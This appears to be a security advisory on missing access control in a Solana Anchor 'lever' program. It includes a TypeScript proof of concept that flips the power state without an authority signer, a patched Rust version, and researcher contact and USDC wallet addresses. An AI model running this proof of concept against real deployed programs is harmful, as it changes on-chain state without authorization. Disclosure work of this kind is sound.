# Security Advisory: Missing Access Control in `switch_power`

**Severity: HIGH**

## Executive Summary

The `lever` program allows any caller to mutate the `PowerStatus` account via `switch_power` because the instruction does not require or validate a signer/authority. The `PowerStatus` account also stores no owner/authority, so there is no on-chain basis for access control. An attacker can toggle the power state of any initialized lever account.

## Vulnerability Description

Affected code:

- `switch_power` in `#[program] pub mod lever`
- `SetPowerStatus` accounts struct
- `PowerStatus` account struct
- `initialize` instruction

`SetPowerStatus` only declares:

```rust
#[account(mut)]
pub power: Account<'info, PowerStatus>,
```

No signer is included, and `PowerStatus` contains only:

```rust
pub struct PowerStatus {
    pub is_on: bool,
}
```

As a result, `switch_power` performs:

```rust
power.is_on = !power.is_on;
```

without verifying who is allowed to change the state. Anchor's `Account<'info, PowerStatus>` validates program ownership and the account discriminator, but it does not establish authorization.

## Exploitation Scenario

An attacker obtains the public key of a target `PowerStatus` account, then calls `switch_power` with an arbitrary name. No signer is required, so the transaction succeeds and flips `is_on`.

### TypeScript / Anchor PoC

```ts
import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";

const provider = anchor.AnchorProvider.env();
anchor.setProvider(provider);

const program = anchor.workspace.Lever as Program<any>;

const power = anchor.web3.Keypair.generate();

await program.methods
  .initialize()
  .accounts({
    power: power.publicKey,
    user: provider.wallet.publicKey,
    systemProgram: anchor.web3.SystemProgram.programId,
  })
  .signers([power])
  .rpc();

// Attacker toggles power without being the initializer or any authority.
await program.methods
  .switchPower("attacker")
  .accounts({
    power: power.publicKey,
  })
  .rpc();

const state = await program.account.powerStatus.fetch(power.publicKey);
console.log("Power is on:", state.isOn);
```

## Recommended Remediation Patch

### Rust replacement code

```rust
use anchor_lang::prelude::*;

declare_id!("A6GUsa5Ej8iWzMMP3B6otFVB5aaUckVm8a31Y5TMLYRV");

#[program]
pub mod lever {
    use super::*;

    pub fn initialize(ctx: Context<InitializeLever>) -> Result<()> {
        let power = &mut ctx.accounts.power;
        power.is_on = false;
        power.authority = ctx.accounts.user.key();
        Ok(())
    }

    pub fn switch_power(ctx: Context<SetPowerStatus>, name: String) -> Result<()> {
        let power = &mut ctx.accounts.power;

        require_keys_eq!(
            power.authority,
            ctx.accounts.authority.key(),
            LeverError::Unauthorized
        );

        power.is_on = !power.is_on;

        msg!("{} is pulling the power switch!", &name);

        match power.is_on {
            true => msg!("The power is now on."),
            false => msg!("The power is now off!"),
        };

        Ok(())
    }
}

#[derive(Accounts)]
pub struct InitializeLever<'info> {
    #[account(init, payer = user, space = 8 + 1 + 32)]
    pub power: Account<'info, PowerStatus>,
    #[account(mut)]
    pub user: Signer<'info>,
    pub system_program: Program<'info, System>,
}

#[derive(Accounts)]
pub struct SetPowerStatus<'info> {
    #[account(mut, has_one = authority)]
    pub power: Account<'info, PowerStatus>,
    pub authority: Signer<'info>,
}

#[account]
pub struct PowerStatus {
    pub is_on: bool,
    pub authority: Pubkey,
}

#[error_code]
pub enum LeverError {
    #[msg("Unauthorized power switch operation.")]
    Unauthorized,
}
```

## Author & Disclosure Details

Researcher: Alex Rayyan (bansoslab2026@tutamail.com)  
USDC (Solana): 39YTqgacjKt1iz22SrvX4G3Ds8TUUjd9hWPPSJpdd2jZ  
USDC (Base/EVM): 0xf71e0734cb53162e8c9baaf5f49841a51c945899